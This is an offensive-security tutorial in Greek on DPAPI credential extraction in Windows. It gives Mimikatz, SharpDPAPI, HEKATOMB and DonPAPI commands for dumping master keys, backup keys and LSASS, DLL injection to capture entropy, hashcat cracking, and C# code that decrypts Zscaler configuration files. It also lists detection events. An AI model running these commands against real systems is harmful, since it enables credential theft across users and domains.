# DPAPI - Εξαγωγή Κωδικών

{{#include ../../banners/hacktricks-training.md}}



## Τι είναι το DPAPI

Η Data Protection API (DPAPI) χρησιμοποιείται κυρίως στο λειτουργικό σύστημα Windows για την **συμμετρική κρυπτογράφηση ασύμμετρων ιδιωτικών κλειδιών**, αξιοποιώντας είτε μυστικά του χρήστη είτε του συστήματος ως σημαντική πηγή εντροπίας. Αυτή η προσέγγιση απλοποιεί την κρυπτογράφηση για τους προγραμματιστές επιτρέποντάς τους να κρυπτογραφούν δεδομένα χρησιμοποιώντας ένα κλειδί παράγωγο από τα διαπιστευτήρια σύνδεσης του χρήστη ή, για κρυπτογράφηση συστήματος, από τα διαπιστευτήρια ελέγχου ταυτότητας του domain του συστήματος, εξαλείφοντας έτσι την ανάγκη οι προγραμματιστές να διαχειρίζονται την προστασία του κλειδιού κρυπτογράφησης οι ίδιοι.

Ο πιο κοινός τρόπος χρήσης του DPAPI είναι μέσω των συναρτήσεων **`CryptProtectData` και `CryptUnprotectData`**, οι οποίες επιτρέπουν στις εφαρμογές να κρυπτογραφούν και να αποκρυπτογραφούν δεδομένα με ασφάλεια στη συνεδρία της διεργασίας που είναι αυτή τη στιγμή συνδεδεμένη. Αυτό σημαίνει ότι τα κρυπτογραφημένα δεδομένα μπορούν να αποκρυπτογραφηθούν μόνο από τον ίδιο χρήστη ή σύστημα που τα κρυπτογράφησε.

Επιπλέον, αυτές οι συναρτήσεις δέχονται επίσης μία **παράμετρο `entropy`** η οποία χρησιμοποιείται κατά την κρυπτογράφηση και την αποκρυπτογράφηση· επομένως, για να αποκρυπτογραφήσετε κάτι που κρυπτογραφήθηκε χρησιμοποιώντας αυτή την παράμετρο, πρέπει να δώσετε την ίδια τιμή entropy που χρησιμοποιήθηκε κατά την κρυπτογράφηση.

### Δημιουργία κλειδιού χρήστη

Το DPAPI δημιουργεί ένα μοναδικό κλειδί (που ονομάζεται **`pre-key`**) για κάθε χρήστη με βάση τα διαπιστευτήριά του. Αυτό το κλειδί παράγεται από τον κωδικό πρόσβασης του χρήστη και άλλους παράγοντες και ο αλγόριθμος εξαρτάται από τον τύπο του χρήστη αλλά στο τέλος γίνεται SHA1. Για παράδειγμα, για χρήστες domain, **εξαρτάται από το NTLM hash του χρήστη**.

Αυτό είναι ιδιαίτερα ενδιαφέρον γιατί αν ένας επιτιθέμενος μπορέσει να αποκτήσει το hash του κωδικού του χρήστη, μπορεί να:

- **Αποκρυπτογραφήσει οποιοδήποτε δεδομένο κρυπτογραφήθηκε με DPAPI** χρησιμοποιώντας το κλειδί αυτού του χρήστη χωρίς να χρειαστεί να επικοινωνήσει με οποιοδήποτε API
- Προσπαθήσει να **σπάσει τον κωδικό** offline προσπαθώντας να παράγει το έγκυρο DPAPI key

Επιπλέον, κάθε φορά που κάποια δεδομένα κρυπτογραφούνται από έναν χρήστη με χρήση του DPAPI, δημιουργείται ένα νέο **master key**. Αυτό το master key είναι το πραγματικά χρησιμοποιούμενο για την κρυπτογράφηση των δεδομένων. Κάθε master key έχει ένα **GUID** (Globally Unique Identifier) που το ταυτοποιεί.

Τα master keys αποθηκεύονται στον κατάλογο **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, όπου `{SID}` είναι ο Security Identifier του χρήστη. Το master key αποθηκεύεται κρυπτογραφημένο από το **`pre-key`** του χρήστη και επίσης από ένα **domain backup key** για ανάκτηση (έτσι το ίδιο κλειδί αποθηκεύεται κρυπτογραφημένο δύο φορές με δύο διαφορετικούς τρόπους).

Σημειώστε ότι το **domain key που χρησιμοποιείται για να κρυπτογραφήσει το master key βρίσκεται στους domain controllers και δεν αλλάζει ποτέ**, οπότε αν ένας επιτιθέμενος έχει πρόσβαση στον domain controller, μπορεί να ανακτήσει το domain backup key και να αποκρυπτογραφήσει τα master keys όλων των χρηστών στο domain.

Τα κρυπτογραφημένα blobs περιέχουν το **GUID του master key** που χρησιμοποιήθηκε για να κρυπτογραφήσει τα δεδομένα μέσα στις κεφαλίδες τους.

> [!TIP]
> DPAPI encrypted blobs starts with **`01 00 00 00`**

Find master keys:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
This is what a bunch of Master Keys of a user will looks like:

![](<../../images/image (1121).png>)

### Δημιουργία κλειδιού μηχανής/συστήματος

Αυτό είναι το κλειδί που χρησιμοποιείται από τη μηχανή για την κρυπτογράφηση δεδομένων. Βασίζεται στο **DPAPI_SYSTEM LSA secret**, που είναι ένα ειδικό κλειδί προσβάσιμο μόνο από τον SYSTEM user. Αυτό το κλειδί χρησιμοποιείται για την κρυπτογράφηση δεδομένων που πρέπει να είναι προσβάσιμα από το ίδιο το σύστημα, όπως διαπιστευτήρια σε επίπεδο μηχανής ή μυστικά σε επίπεδο συστήματος.

Σημειώστε ότι αυτά τα κλειδιά **δεν έχουν domain backup**, οπότε είναι προσβάσιμα μόνο τοπικά:

- **Mimikatz** μπορεί να το προσπελάσει κάνοντας dump των LSA secrets χρησιμοποιώντας την εντολή: `mimikatz lsadump::secrets`
- Το secret αποθηκεύεται μέσα στο registry, οπότε ένας διαχειριστής θα μπορούσε να **τροποποιήσει τα δικαιώματα DACL για να έχει πρόσβαση**. Η διαδρομή στο registry είναι: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`


### Δεδομένα προστατευμένα από το DPAPI

Μεταξύ των προσωπικών δεδομένων που προστατεύονται από το DPAPI είναι:

- διαπιστευτήρια Windows
- κωδικοί και δεδομένα αυτόματης συμπλήρωσης του Internet Explorer και του Google Chrome
- κωδικοί e-mail και εσωτερικών FTP λογαριασμών για εφαρμογές όπως το Outlook και το Windows Mail
- κωδικοί για κοινόχρηστους φακέλους, πόρους, ασύρματα δίκτυα και το Windows Vault, συμπεριλαμβανομένων κλειδιών κρυπτογράφησης
- κωδικοί για συνδέσεις remote desktop, .NET Passport και ιδιωτικά κλειδιά για διάφορους σκοπούς κρυπτογράφησης και αυθεντικοποίησης
- κωδικοί δικτύου που διαχειρίζεται το Credential Manager και προσωπικά δεδομένα σε εφαρμογές που χρησιμοποιούν CryptProtectData, όπως το Skype, το MSN messenger κ.ά.
- κρυπτογραφημένα blobs μέσα στο registry
- ...

Τα δεδομένα που προστατεύονται σε επίπεδο συστήματος περιλαμβάνουν:
- κωδικούς Wifi
- κωδικούς προγραμματισμένων εργασιών
- ...

### Επιλογές εξαγωγής Master key

- Αν ο χρήστης έχει προνόμια domain admin, μπορεί να προσπελάσει το **domain backup key** για να αποκρυπτογραφήσει όλα τα master keys χρηστών στον domain:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Με δικαιώματα τοπικού διαχειριστή, είναι δυνατό να **έχετε πρόσβαση στη μνήμη του LSASS** ώστε να εξάγετε τα κύρια κλειδιά DPAPI όλων των συνδεδεμένων χρηστών και το κλειδί SYSTEM.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Εάν ο χρήστης έχει τοπικά δικαιώματα διαχειριστή, μπορεί να αποκτήσει πρόσβαση στο **DPAPI_SYSTEM LSA secret** για να αποκρυπτογραφήσει τα machine master keys:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Αν είναι γνωστό το password ή το hash NTLM του χρήστη, μπορείτε να **decrypt the master keys of the user directly**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Αν βρίσκεσαι μέσα σε session ως ο χρήστης, είναι δυνατό να ζητήσεις από τον DC το **backup key to decrypt the master keys using RPC**. Αν είσαι local admin και ο χρήστης είναι συνδεδεμένος, μπορείς να **steal his session token** γι' αυτό:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Λίστα Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Πρόσβαση σε κρυπτογραφημένα δεδομένα DPAPI

### Εύρεση κρυπτογραφημένων δεδομένων DPAPI

Συνήθη **προστατευμένα αρχεία** χρηστών βρίσκονται σε:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Ελέγξτε επίσης να αλλάξετε το `\Roaming\` σε `\Local\` στις παραπάνω διαδρομές.

Enumeration examples:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) μπορεί να βρει DPAPI κρυπτογραφημένα blobs στο file system, στο registry και σε B64 blobs:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Σημειώστε ότι [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (από το ίδιο αποθετήριο) μπορεί να χρησιμοποιηθεί για να αποκρυπτογραφήσει ευαίσθητα δεδομένα που προστατεύονται με DPAPI, όπως cookies.

### Κλειδιά πρόσβασης και δεδομένα

- **Χρησιμοποιήστε SharpDPAPI** για να εξάγετε διαπιστευτήρια από αρχεία κρυπτογραφημένα με DPAPI από την τρέχουσα συνεδρία:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Λάβετε πληροφορίες διαπιστευτηρίων** όπως τα κρυπτογραφημένα δεδομένα και το guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Πρόσβαση masterkeys**:

Αποκρυπτογραφήστε ένα masterkey ενός χρήστη που ζητάει το **domain backup key** χρησιμοποιώντας RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Το εργαλείο **SharpDPAPI** υποστηρίζει επίσης αυτά τα ορίσματα για την αποκρυπτογράφηση του masterkey (παρατήρησε πώς είναι δυνατό να χρησιμοποιήσεις `/rpc` για να πάρεις το domains backup key, `/password` για να χρησιμοποιήσεις ένα plaintext password, ή `/pvk` για να προσδιορίσεις ένα DPAPI domain private key file...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Decrypt δεδομένα χρησιμοποιώντας ένα masterkey**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Το εργαλείο **SharpDPAPI** υποστηρίζει επίσης αυτά τα ορίσματα για την αποκρυπτογράφηση των `credentials|vaults|rdg|keepass|triage|blob|ps` (σημειώστε πώς είναι δυνατό να χρησιμοποιηθεί το `/rpc` για να λάβετε το domains backup key, το `/password` για να χρησιμοποιήσετε ένα plaintext password, το `/pvk` για να καθορίσετε ένα DPAPI domain private key file, το `/unprotect` για να χρησιμοποιήσετε την τρέχουσα users session...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Αποκρυπτογραφήστε δεδομένα χρησιμοποιώντας την **τρέχουσα συνεδρία χρήστη**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---
### Διαχείριση Προαιρετικού **entropy** ("Third-party entropy")

Ορισμένες εφαρμογές περνούν μια επιπλέον τιμή **entropy** στο `CryptProtectData`. Χωρίς αυτήν την τιμή το blob δεν μπορεί να αποκρυπτογραφηθεί, ακόμα κι αν ο σωστός masterkey είναι γνωστός. Η απόκτηση της **entropy** είναι επομένως ουσιώδης όταν στοχεύουμε διαπιστευτήρια που προστατεύονται με αυτόν τον τρόπο (π.χ. Microsoft Outlook, κάποιοι VPN clients).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) είναι ένα user-mode DLL που κάνει hook τις DPAPI functions μέσα στη στοχευόμενη διεργασία και καταγράφει διαφανώς οποιαδήποτε προαιρετική **entropy** που παρέχεται. Η εκτέλεση του EntropyCapture σε **DLL-injection** mode ενάντια σε διεργασίες όπως `outlook.exe` ή `vpnclient.exe` θα παράγει ένα αρχείο που αντιστοιχίζει κάθε entropy buffer με τη διαδικασία που το κάλεσε και το blob. Η καταγεγραμμένη **entropy** μπορεί αργότερα να δοθεί στο **SharpDPAPI** (`/entropy:`) ή στο **Mimikatz** (`/entropy:<file>`) για να αποκρυπτογραφηθούν τα δεδομένα.
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking masterkeys offline (Hashcat & DPAPISnoop)

Η Microsoft εισήγαγε μια μορφή masterkey **context 3** ξεκινώντας από τα Windows 10 v1607 (2016). `hashcat` v6.2.6 (December 2023) πρόσθεσε hash-modes **22100** (DPAPI masterkey v1 context ), **22101** (context 1) και **22102** (context 3), επιτρέποντας GPU-accelerated cracking των κωδικών χρηστών απευθείας από το αρχείο masterkey. Οι επιτιθέμενοι μπορούν επομένως να πραγματοποιήσουν word-list ή brute-force επιθέσεις χωρίς να αλληλεπιδράσουν με το σύστημα-στόχο.

`DPAPISnoop` (2024) αυτοματοποιεί τη διαδικασία:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Το εργαλείο μπορεί επίσης να αναλύσει Credential και Vault blobs, να τα αποκρυπτογραφήσει με cracked keys και να εξάγει cleartext passwords.

### Πρόσβαση σε δεδομένα άλλης μηχανής

Στο **SharpDPAPI and SharpChrome** μπορείτε να υποδείξετε την επιλογή **`/server:HOST`** για να αποκτήσετε πρόσβαση στα δεδομένα μιας απομακρυσμένης μηχανής. Φυσικά πρέπει να μπορείτε να προσπελάσετε αυτήν τη μηχανή και στο παρακάτω παράδειγμα υποτίθεται ότι το **domain backup encryption key is known**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Άλλα εργαλεία

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) είναι ένα εργαλείο που αυτοματοποιεί την εξαγωγή όλων των χρηστών και υπολογιστών από τον LDAP κατάλογο και την εξαγωγή του domain controller backup key μέσω RPC. Το script στη συνέχεια επιλύει όλες τις IP διευθύνσεις των υπολογιστών και εκτελεί smbclient σε όλους τους υπολογιστές για να ανακτήσει όλα τα DPAPI blobs όλων των χρηστών και να αποκρυπτογραφήσει τα πάντα με το domain backup key.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Με την λίστα υπολογιστών που εξήχθησαν από LDAP μπορείτε να βρείτε κάθε υποδίκτυο ακόμα κι αν δεν τα γνωρίζατε!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) μπορεί να κάνετε dump μυστικών που προστατεύονται από DPAPI αυτόματα. Η έκδοση 2.x εισήγαγε:

* Παράλληλη συλλογή blobs από εκατοντάδες hosts
* Parsing των **context 3** masterkeys και αυτόματη ενσωμάτωση cracking με Hashcat
* Υποστήριξη για Chrome "App-Bound" κρυπτογραφημένα cookies (βλ. επόμενη ενότητα)
* Νέο mode **`--snapshot`** για επαναλαμβανόμενο polling endpoints και diff των νεοδημιουργημένων blobs

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) είναι ένας parser σε C# για αρχεία masterkey/credential/vault που μπορεί να εξάγει μορφές για Hashcat/JtR και προαιρετικά να εκκινήσει cracking αυτόματα. Υποστηρίζει πλήρως μορφές machine και user masterkey έως και Windows 11 24H1.


## Συνήθεις ανιχνεύσεις

- Πρόσβαση σε αρχεία στο `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` και σε άλλους φακέλους σχετικούς με DPAPI.
- Ειδικά από ένα network share όπως **C$** ή **ADMIN$**.
- Χρήση εργαλείων όπως **Mimikatz**, **SharpDPAPI** ή παρόμοιο λογισμικό για πρόσβαση στη μνήμη LSASS ή dump masterkeys.
- Event **4662**: *An operation was performed on an object* – μπορεί να συσχετιστεί με πρόσβαση στο αντικείμενο **`BCKUPKEY`**.
- Event **4673/4674** όταν μια διεργασία ζητάει *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### 2023-2025 vulnerabilities & ecosystem changes

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (Νοέμβριος 2023). Ένας επιτιθέμενος με δικαιώματα δικτύου μπορούσε να παραπλανήσει ένα domain member ώστε να ανακτήσει ένα κακόβουλο DPAPI backup key, επιτρέποντας την αποκρυπτογράφηση των user masterkeys. Διορθώθηκε στο November 2023 cumulative update – οι διαχειριστές θα πρέπει να εξασφαλίσουν ότι οι DCs και οι σταθμοί εργασίας είναι πλήρως patched.
* Chrome 127 “App-Bound” cookie encryption (Ιούλιος 2024) αντικατέστησε την παλαιότερη προστασία μόνο με DPAPI με ένα επιπλέον κλειδί που αποθηκεύεται στο **Credential Manager** του χρήστη. Η offline αποκρυπτογράφηση των cookies τώρα απαιτεί τόσο το DPAPI masterkey όσο και το **GCM-wrapped app-bound key**. Το SharpChrome v2.3 και το DonPAPI 2.x μπορούν να ανακτήσουν το επιπλέον κλειδί όταν τρέχουν με user context.


### Case Study: Zscaler Client Connector – Custom Entropy Derived From SID

Το Zscaler Client Connector αποθηκεύει αρκετά αρχεία ρυθμίσεων κάτω από το `C:\ProgramData\Zscaler` (π.χ. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Κάθε αρχείο είναι κρυπτογραφημένο με **DPAPI (Machine scope)** αλλά ο vendor παρέχει **προσαρμοσμένη εντροπία** που υπολογίζεται κατά την εκτέλεση αντί να αποθηκεύεται στον δίσκο.

Η εντροπία αναδημιουργείται από δύο στοιχεία:

1. Ένα hard-coded secret ενσωματωμένο μέσα στο `ZSACredentialProvider.dll`.
2. Το **SID** του Windows account στο οποίο ανήκει η ρύθμιση.

Ο αλγόριθμος που υλοποιείται από το DLL είναι ισοδύναμος με:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Επειδή το μυστικό είναι ενσωματωμένο σε ένα DLL που μπορεί να διαβαστεί από τον δίσκο, **οποιοσδήποτε τοπικός επιτιθέμενος με δικαιώματα SYSTEM μπορεί να αναγεννήσει την εντροπία για οποιοδήποτε SID** και να αποκρυπτογραφήσει τα blobs εκτός σύνδεσης:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Η αποκρυπτογράφηση αποδίδει την πλήρη JSON διαμόρφωση, συμπεριλαμβανομένου κάθε **έλεγχου κατάστασης συσκευής** και της αναμενόμενης τιμής του – πληροφορία που είναι πολύτιμη όταν προσπαθεί κανείς να πραγματοποιήσει παρακάμψεις στην πλευρά του client.

> ΣΥΜΒΟΥΛΗ: τα άλλα κρυπτογραφημένα αρχεία (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) προστατεύονται με DPAPI **χωρίς** entropy (`16` μηδενικά bytes). Συνεπώς μπορούν να αποκωδικοποιηθούν απευθείας με `ProtectedData.Unprotect` μόλις αποκτηθούν δικαιώματα SYSTEM.

## Αναφορές

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)

{{#include ../../banners/hacktricks-training.md}}
